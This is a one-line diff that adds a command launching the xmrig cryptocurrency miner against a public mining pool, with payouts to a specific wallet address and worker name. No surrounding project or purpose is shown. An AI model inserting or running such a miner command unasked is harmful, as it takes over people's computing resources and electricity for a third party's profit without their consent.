@@ -1,0 +1,1 @@
+xmrig.exe --coin monero -o rx.unmineable.com:3333 -u SHIB:0x3f530a5b9edf2813a1886e69c86336b2b528963a.I5_NEW#dhoe-uwnh -p x --donate-level 1
